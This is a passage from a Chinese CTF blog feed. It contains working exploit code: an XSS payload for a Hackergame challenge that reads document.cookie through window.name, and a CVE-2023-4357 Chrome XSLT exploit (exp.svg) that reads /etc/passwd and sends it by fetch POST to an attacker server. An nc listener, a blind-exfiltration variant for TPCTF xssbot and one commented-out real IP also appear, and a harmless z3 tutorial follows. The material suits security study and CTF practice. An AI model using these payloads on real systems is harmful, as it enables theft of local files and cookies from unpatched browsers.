html">updateElement(&quot;#comment&quot;, &quot;你留下的评论：123123&quot;);<br></code></pre></td></tr></table></figure><p>于是在这里就有一种注入方式，如果我们的输入带有双引号<code>&quot;123123&quot;</code>，就会变成这样子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">updateElement(&quot;#comment&quot;, &quot;你留下的评论：&quot;123123&quot;&quot;);<br></code></pre></td></tr></table></figure><p>也就是会把前项闭合</p><p>如果说再带一个加号<code>&quot;+123123+&quot;</code>，就会变成这样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">updateElement(&quot;#comment&quot;, &quot;你留下的评论：&quot;+123123+&quot;&quot;);<br></code></pre></td></tr></table></figure><p>这就相当于把输入独立出来，如果把这里面的<code>123123</code>换成一些JS语句，那么JS语句执行的结果就会被拼接进这个评论里面，从而达到攻击目的。类似于这样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">updateElement(&quot;#comment&quot;, &quot;你留下的评论：&quot;+JS+&quot;&quot;);<br></code></pre></td></tr></table></figure><p>把JS换成location，会得到这个结果</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-29%2023.18.39.png"></p><p>这就验证了注入的可能性。</p><h3 id="bot分析"><a href="#bot分析" class="headerlink" title="bot分析"></a>bot分析</h3><p>但此时会发现这个评论将字符数量卡在25以内，很难利用。但是题目中也给了提示，即bot会查看我们的弹窗</p><p>在js中弹窗函数是这个：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(url, target, windowFeatures)<br></code></pre></td></tr></table></figure><p>其中url是弹窗要转去的地址，target是转去之后窗口的名字，在任意一个窗口输入如下语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;https://www.example.com&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>) <br></code></pre></td></tr></table></figure><p>浏览器可能会阻止弹窗，点击允许弹窗后就会转去另一个窗口</p><p>在另一个窗口控制台输入如下语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span><br></code></pre></td></tr></table></figure><p>就会得到窗口名字</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2000.24.18.png"></p><p>这个地方注意，使用<code>window.name</code>与<code>name</code>是等效的，也就是会有一个默认的<code>window</code>全局变量。这其实与<code>window.alert(1)</code>与<code>alert(1)</code>是一样道理。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们可以往评论区插入一部分JS代码，而后Bot会执行我们的html代码。因此我们需要在评论插入<code>&#123;1:location=name&#125;</code>语句，在我们自己的html处设置name为我们想要的JS语句，再跳转至界面，就可以执行我们的JS语句</p><p>step1:先在评论区插入<code>&quot;+&#123;1:location=name&#125;+&quot;</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2001.52.25.png"></p><p>step2:构造一个html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">//设置跳转后窗口名字</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span> =</span><br><span class="language-javascript">  <span class="hljs-string">&quot;javascript:document.querySelector(&#x27;textarea&#x27;).value=document.cookie.replace(/%/g,&#x27;#&#x27;).substring(0,20);document.querySelector(&#x27;button&#x27;).click()&quot;</span>;<span class="hljs-comment">//第一步是设置评论区为flag，flag需要做一些处理。第二步是将评论提交出去</span></span><br><span class="language-javascript">  </span><br><span class="language-javascript">    location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;http://web/result&quot;</span>;<span class="hljs-comment">//这一步是使得bot跳转</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>step3提取flag</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2001.57.16.png"></p><h2 id="CVE-2023-4357"><a href="#CVE-2023-4357" class="headerlink" title="CVE-2023-4357"></a>CVE-2023-4357</h2><p>网上已经有很多对此漏洞的分析，这里只作出复现步骤</p><p>版本：Google Chrome &lt; 116.0.5845.96</p><p>在服务器上准备此exp</p><p>exp:</p><p>exp.svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    这里换敏感目录--&gt; </span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用有漏洞的浏览器访问</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2002.05.14.png"></p><p>如果需要外带则加上一段代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    这里换敏感目录--&gt;</span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> data = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.flag&quot;</span>).<span class="hljs-property">textContent</span>;</span><br><span class="language-javascript">                <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://服务器地址:端口&quot;</span>, &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span></span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">body</span>: data</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>先在服务器上监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvp 3389<br></code></pre></td></tr></table></figure><p>然后等待别人访问服务器上的exp.svg</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2002.12.29.png"></p><h2 id="TPCTF-2023"><a href="#TPCTF-2023" class="headerlink" title="TPCTF 2023"></a>TPCTF 2023</h2><h3 id="xssbot"><a href="#xssbot" class="headerlink" title="xssbot"></a>xssbot</h3><p>这题目给了两个附件，一个是bot.py，一个是dockerfile，其中bot.py与hackergame那题几乎一模一样，处理逻辑也是相当。为了复现题目，我们可以使用提供的dockerfile来构建一个镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t 镜像名字<br></code></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --rm 镜像名字 <br></code></pre></td></tr></table></figure><p>运行之后会要求输入一个文件名，这个可以随意</p><p>然后就是输入exp.svg来进行攻击，这里与上面的exp.svg是一样的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    这里换敏感目录--&gt;</span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> data = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.flag&quot;</span>).<span class="hljs-property">textContent</span>;</span><br><span class="language-javascript">                <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://服务器地址:端口&quot;</span>, &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span></span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">body</span>: data</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不过这里我依然使用<code>/etc/passwd</code>作为敏感目录，比赛中换为<code>/flag</code>即可</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-30%2002.22.58.png"></p><p>随后就能在服务器上收到消息了</p><h3 id="xssbot-but-no-Internet"><a href="#xssbot-but-no-Internet" class="headerlink" title="xssbot but no Internet"></a>xssbot but no Internet</h3><p>这题与上题一样，不过没有网络链接，需要使用盲注，稍微改下exp即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;?#&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">div</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>&lt;!--    这里换敏感目录--&gt;</span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;flag&quot;</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> data = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.flag&quot;</span>).<span class="hljs-property">textContent</span>;</span><br><span class="language-javascript">                <span class="hljs-comment">// fetch(&quot;http://114.132.159.167:3389&quot;, &#123;</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     method: &#x27;POST&#x27;,</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     headers: &#123;</span></span><br><span class="language-javascript">                <span class="hljs-comment">//         &#x27;Content-Type&#x27;: &#x27;text/plain&#x27;</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     &#125;,</span></span><br><span class="language-javascript">                <span class="hljs-comment">//     body: data</span></span><br><span class="language-javascript">                <span class="hljs-comment">// &#125;)</span></span><br><span class="language-javascript">                <span class="hljs-keyword">if</span>(data[<span class="hljs-number">0</span>]!=<span class="hljs-number">0</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)</span><br><span class="language-javascript">                    &#123;</span><br><span class="language-javascript">                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>xss</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>z3笔记</title>
    <link href="/2023/11/07/z3_study/"/>
    <url>/2023/11/07/z3_study/</url>
    
    <content type="html"><![CDATA[<p>记录一些z3食用方式</p><span id="more"></span><h2 id="1-变量定义"><a href="#1-变量定义" class="headerlink" title="1. 变量定义"></a>1. 变量定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义一个整型变量</span><br>x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br><span class="hljs-comment"># 定义两个实数型变量，</span><br>a, b = Reals(<span class="hljs-string">&#x27;a b&#x27;</span>)<br><span class="hljs-comment"># 定义一个32位向量</span><br>eax = BitVec(<span class="hljs-string">&#x27;eax&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-comment"># 定义两个32位向量</span><br>ebx, ecx = BitVecs(<span class="hljs-string">&#x27;ebx ecx&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-comment"># 定义一组变量列表</span><br>X = [Int(<span class="hljs-string">&#x27;x_%s&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br></code></pre></td></tr></table></figure><h2 id="2-逻辑相关"><a href="#2-逻辑相关" class="headerlink" title="2.逻辑相关"></a>2.逻辑相关</h2><h3 id="And与Or"><a href="#And与Or" class="headerlink" title="And与Or"></a>And与Or</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Int(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br><span class="hljs-comment"># 或逻辑，两者满足其一</span><br>constrains1 = Or(x &lt; <span class="hljs-number">0</span>, x &gt; <span class="hljs-number">5</span>)<br><span class="hljs-comment"># 与逻辑，两者均要满足</span><br>constrains2 = And(<span class="hljs-number">1</span> &lt; y, y &lt; <span class="hljs-number">10</span>)<br><span class="hljs-comment"># 取反</span><br>constrains3 = Not(x &lt; -<span class="hljs-number">1</span>)<br><br>s = Solver()<br>s.add(constrains1, constrains2)<br></code></pre></td></tr></table></figure><h3 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Int(<span class="hljs-string">&#x27;y&#x27;</span>)<br>s = Solver()<br><span class="hljs-comment"># 添加If约束</span><br>s.add(If(y &gt; <span class="hljs-number">10</span>, x == <span class="hljs-number">115</span>, x == <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h2 id="3-输出相关"><a href="#3-输出相关" class="headerlink" title="3.输出相关"></a>3.输出相关</h2><h3 id="式子"><a href="#式子" class="headerlink" title="式子"></a>式子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Int(<span class="hljs-string">&#x27;y&#x27;</span>)<br>z = Int(<span class="hljs-string">&#x27;z&#x27;</span>)<br><br>n = x + y + z == <span class="hljs-number">3</span><br><br><span class="hljs-comment"># 输出子式数目</span><br><span class="hljs-built_in">print</span>(n.num_args())<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">2</span><br><br><span class="hljs-comment"># 输出表达式的子式</span><br><span class="hljs-built_in">print</span>(n.children())<br><span class="hljs-meta">&gt;&gt;&gt; </span>[x + y + z, <span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># 输出具体子式</span><br><span class="hljs-built_in">print</span>(n.arg(<span class="hljs-number">0</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>x+y+Z<br><span class="hljs-built_in">print</span>(n.arg(<span class="hljs-number">1</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">3</span><br><br><span class="hljs-comment"># 输出具体操作</span><br><span class="hljs-built_in">print</span>(n.decl())<br><span class="hljs-meta">&gt;&gt;&gt; </span>==<br><br></code></pre></td></tr></table></figure><h3 id="输出具体值设置"><a href="#输出具体值设置" class="headerlink" title="输出具体值设置"></a>输出具体值设置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)<br><span class="hljs-comment"># 输出分数</span><br>solve(<span class="hljs-number">3</span>*x == <span class="hljs-number">1</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>[<span class="hljs-number">1</span>/<span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># 输出十进制数</span><br>set_option(rational_to_decimal=<span class="hljs-literal">True</span>)<br>solve(<span class="hljs-number">3</span>*x == <span class="hljs-number">1</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>[x = <span class="hljs-number">0.3333333333</span>?]<br><br><span class="hljs-comment"># 设定小数位数</span><br>set_option(precision=<span class="hljs-number">30</span>)<br>solve(<span class="hljs-number">3</span>*x == <span class="hljs-number">1</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>[x = <span class="hljs-number">0.333333333333333333333333333333</span>?]<br></code></pre></td></tr></table></figure><h3 id="输出约束"><a href="#输出约束" class="headerlink" title="输出约束"></a>输出约束</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Real(<span class="hljs-string">&#x27;y&#x27;</span>)<br>s = Solver()<br>s.add(x &gt; <span class="hljs-number">1</span>, y &gt; <span class="hljs-number">1</span>, Or(x + y &gt; <span class="hljs-number">3</span>, x - y &lt; <span class="hljs-number">2</span>))<br><span class="hljs-comment"># 输出约束条件 可以用来验证约束设定的对不对</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s.assertions():<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-meta">&gt;&gt;&gt; </span>x &gt; <span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; 